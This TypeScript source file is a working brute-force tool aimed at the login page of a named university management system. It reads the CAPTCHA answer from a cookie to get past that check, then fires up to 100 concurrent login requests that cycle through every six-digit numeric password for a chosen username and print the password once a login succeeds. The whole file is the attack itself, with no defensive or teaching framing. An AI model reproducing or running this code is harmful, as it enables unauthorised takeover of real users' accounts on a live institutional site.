import FormData = require("form-data");
import fetch, { FetchError } from "node-fetch"
import cheerio = require("cheerio")
import Utils from "./utils"
import async, { queue } from 'async';
const log = console.log
const baseUrl = "http://mis.sse.ustc.edu.cn/"
const pattern = /ValidateCode\.aspx(.*?)[0-9]\\/g


export function worker(username: string,password:string="000000",concurrency:number=100): Promise<any>{
  return new Promise((resolve,reject)=>{
    let success = false
    let view_state = ""
    username = username.toLowerCase()
    log("username: ",username)
        /**
         * 获取登陆页的html
         */
    async function main(){
      try {
        const result = await fetch(baseUrl)
        const cookieJar = new Map()
        const sessionId = Utils.getCookie(result)
        cookieJar.set("sessionId",sessionId);
        const body = await result.text()
        const $ = cheerio.load(body);
        view_state = $("#__VIEWSTATE").val();//view state字段
        const imgUrl = body.match(pattern) || [""];
        const url = baseUrl + imgUrl[0].replace("&amp;", "&");//验证码url
        const r = await fetch(url, {
          headers: {
            "cookie": Array.from(cookieJar.values()).join(";")
          }
        });
        const validate = Utils.getCookie(r)//验证码
        cookieJar.set("validate",validate);
        const validateCode = (validate.match(/[0-9]{4}/) || [""])[0];
        log("validate code:", validateCode);
        let sum = 0;
        validateCode.split("").forEach(val => {
          sum += parseInt(val);
        });
        log("sum:", sum);
        log("session", cookieJar);
        const trypass = async.queue(async function(password:string,done){
          /**
           * 组装数据
           */
          const formData = new FormData();
          formData.append("__EVENTTARGET", "winLogin$sfLogin$ContentPanel1$btnLogin");
          formData.append("__VIEWSTATE", view_state);
          formData.append("winLogin$sfLogin$txtUserLoginID", username);
          formData.append('winLogin$sfLogin$txtPassword', password);
          formData.append('winLogin$sfLogin$txtValidate', sum + "");
          
          try {
            const login = await fetch(baseUrl + "default.aspx", {
              method: "post",
              headers: {
                cookie: Array.from(cookieJar.values()).join(";")
              },
              body: formData
            });
            /**
             * iflysse是登陆成功时拿到的cookie值
             */
            const iflysse = Utils.getCookie(login);
            if (iflysse.length === 0) {
              log("failed ", "password: ", password);
            }
            else {
              log("success ", "用户名: ", username, "密码: ", password);
              success = true;
              resolve("success " + "用户名: " + username + "密码: " + password);
            }
            done();
          }
          catch (e) {
            log(e);
            done();
          }
        },concurrency)
        
        const push = ()=>{
          trypass.push(password,()=>{
            log("length",trypass.length())
            log("running",trypass.running())
            if(trypass.length()<concurrency&&parseInt(password)<1000000&&!success){
              push()
            }
            if(success){
              trypass.kill()
            }
          })
          password = increase(password)
        }
        trypass.drain(()=>{//队列消耗完回调
          resolve(`failed on username: ${username}`)
        })
        trypass.error((error,task)=>{
          log("request failed "+task," detail ",error)
        })

        for(let i=0;i<concurrency;i++){
          push()
        }
      } catch (error) {
        log(error)
      }
    }
    main()
  })
}  
    
    
  function increase(num: string){
    num = ""+(parseInt(num)+1)
    if(num.length<6){
      const len = num.length
      for(let i=0;i<6-len;i++){
        num = 0+num
      }
    }
    return num
  }
